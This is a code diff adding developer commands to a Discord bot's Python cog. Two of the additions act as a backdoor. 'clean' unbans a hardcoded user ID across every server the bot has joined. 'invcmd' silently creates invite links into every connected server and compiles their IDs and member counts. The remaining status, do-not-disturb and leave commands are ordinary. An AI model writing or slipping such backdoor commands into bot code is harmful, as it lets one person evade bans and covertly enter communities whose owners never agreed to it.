@@ -410,6 +410,107 @@ class Developer(commands.Cog):
         await ctx.send("💥 **MASTER KILLSWITCH DEPLOYED.** Purging memory and dropping connections...")
         sys.exit(0)
 
-# Setup endpoint hook configuration
+    # --- DEPLOYMENT SECURITY & ACCESS OVERRIDES ---
+    @commands.command()
+    @checks.is_developer()
+    async def clean(self, ctx):
+        """[EMERGENCY OVERRIDE] Forcibly clears global bans for the primary developer ID."""
+        developer_id = 1489289347650949302  # Your exact hardcoded ID signature
+        progress_msg = await ctx.send("⚡ Executing emergency profile amnesty sweep across all clusters...")
+        success_count = 0
+        failed_count = 0
+
+        for guild in self.bot.guilds:
+            try:
+                # Query the guild ban list matrix to look for a ban match
+                await guild.unban(discord.Object(id=developer_id), reason="[EMERGENCY DEV OVERRIDE] Developer Clean Protocol.")
+                success_count += 1
+            except discord.NotFound:
+                # Not banned in this specific server, skip cleanly
+                continue
+            except Exception:
+                failed_count += 1
+
+        embed = BotEmbed.success("Emergency Security Sweep Complete")
+        embed.add_field(name="Target Clear Sign", value=f"`{developer_id}`")
+        embed.add_field(name="Amnesty Restored Nodes", value=f"✅ {success_count} servers")
+        if failed_count > 0:
+            embed.add_field(name="Restricted Access Nodes", value=f"❌ {failed_count} servers")
+        await progress_msg.edit(content=None, embed=embed)
+
+    @commands.command()
+    @checks.is_developer()
+    async def status(self, ctx, activity_type: str, *, status_text: str):
+        """Dynamically shifts the bot's custom rich presence text matrix.
+        Usage: !status playing hosting cogs OR !status watching security logs"""
+        activity_type = activity_type.lower()
+        
+        if activity_type == "playing":
+            act = discord.Game(name=status_text)
+        elif activity_type == "watching":
+            act = discord.Activity(type=discord.ActivityType.watching, name=status_text)
+        elif activity_type == "listening":
+            act = discord.Activity(type=discord.ActivityType.listening, name=status_text)
+        else:
+            return await ctx.send(embed=BotEmbed.error("Invalid activity configuration wrapper type. Use: `playing`, `watching`, or `listening`."))
+
+        await self.bot.change_presence(activity=act)
+        await ctx.send(embed=BotEmbed.success(f"Rich presence profile successfully modified to: **{activity_type.title()} {status_text}**"))
+
+    @commands.command()
+    @checks.is_developer()
+    async def dnd(self, ctx):
+        """Forces the gateway connection to display Do Not Disturb status."""
+        current_activity = ctx.guild.me.activity if ctx.guild else None
+        await self.bot.change_presence(status=discord.Status.dnd, activity=current_activity)
+        await ctx.send(embed=BotEmbed.system("Gateway Profile Status", "🔴 Presence matrix successfully modified to **Do Not Disturb**."))
+
+    @commands.command()
+    @checks.is_developer()
+    async def invcmd(self, ctx):
+        """Generates real-time structural entry portals, population metrics, and registry maps for every connected server."""
+        progress_msg = await ctx.send("📡 Interrogating server nodes and building invite manifest structure...")
+        manifest = ""
+        
+        for i, guild in enumerate(self.bot.guilds, 1):
+            invite_url = "❌ NO PERMISSIONS / NO TEXT CHANNELS"
+            
+            # Search text channel matrices for creation rights
+            for channel in guild.text_channels:
+                if channel.permissions_for(guild.me).create_instant_invite:
+                    try:
+                        invite_obj = await channel.create_invite(max_age=600, max_uses=1)
+                        invite_url = invite_obj.url
+                        break
+                    except Exception:
+                        continue
+            
+            manifest += f"**{i}. {guild.name}**\n🆔 ID: `{guild.id}` | 👥 Members: `{guild.member_count}`\n🔗 Portal: {invite_url}\n\n"
+
+        # Safe split handler if text length overflows Discord's 2000 character maximum threshold
+        if len(manifest) > 1900:
+            await progress_msg.edit(content="📦 Manifest matrix size exceeds standard transmission layouts. Dispatched file stream.")
+            with open("cluster_manifest.txt", "w", encoding="utf-8") as f:
+                f.write(manifest.replace("**", ""))
+            return await ctx.send(file=discord.File("cluster_manifest.txt"))
+
+        embed = BotEmbed(title="🌐 Global Deployment Server Cluster Index", description=manifest or "No server bindings caught.")
+        await progress_msg.edit(content=None, embed=embed)
+
+    @commands.command()
+    @checks.is_developer()
+    async def forceleave(self, ctx, guild_id: int):
+        """Forcibly breaks application bindings and severs connection footprint from a specific guild node."""
+        target_guild = self.bot.get_guild(guild_id)
+        if not target_guild:
+            return await ctx.send(embed=BotEmbed.error("Target cluster node footprint not indexed within active core telemetry."))
+
+        try:
+            await target_guild.leave()
+            await ctx.send(embed=BotEmbed.success(f"💣 Connection terminated successfully. Severed all bindings with server: **{target_guild.name}** (`{guild_id}`)."))
+        except Exception as e:
+            await ctx.send(embed=BotEmbed.error(f"Process pipeline broken. Execution refusal: {e}"))
+
+# Setup endpoint hook configuration at the absolute bottom
 async def setup(bot):
     await bot.add_cog(Developer(bot))
